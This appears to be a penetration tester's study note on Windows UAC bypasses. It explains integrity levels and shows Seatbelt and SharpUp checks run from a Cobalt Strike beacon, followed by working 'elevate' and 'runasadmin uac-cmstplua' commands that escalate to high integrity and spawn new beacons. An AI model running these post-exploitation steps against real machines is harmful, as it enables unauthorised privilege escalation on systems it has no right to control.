---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[UAC Bypasses]]  
___

## Description:  

A UAC bypass is a technique by which an application can go from **Medium** to **High Integrity** without prompting for consent (User has to be a local Administrator).

By default, applications will run in a Medium Integrity context even if the user is a local administrator.

Some of Microsoft's own trusted, signed applications can "auto-elevate" without UAC.

The default configuration for UAC is **Prompt for consent for non-Windows binaries**, but can also have different settings such as **Prompt for credentials**, **Prompt for consent** and **Elevate without prompting**.

[[Seatbelt]] can be used to query the configuration applied to a machine.

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac

====== UAC ======

ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
EnableLUA (Is UAC enabled?)    : 1
```

Use [SharpUp](https://github.com/GhostPack/SharpUp) to check integrity level and if UAC can be bypassed.

```
beacon> getuid
[*] You are DEV\nlamb

beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.
```

Use the `elevate` command in CS to bypass (best)

```
help elevate
 

elevate [exploit] [listener]

#To see exploits
elevate

elevate uac-token-duplication tcp-local
```

You can also use `runasadmin` command in CS (not as good)
```
help runasadmin

runasadmin [exploit] [command] [args]

#To see exploits
runasadmin

# go to attacks, web drive-by, scripted web delivery (S), select beacon_bind_tcp as # listner
runasadmin uac-cmstplua <insert_beacon_command_from_comment_above>

connect localhost 1337

# to get more privs from here
elevate svc-exe tcp-local

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (10:47 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
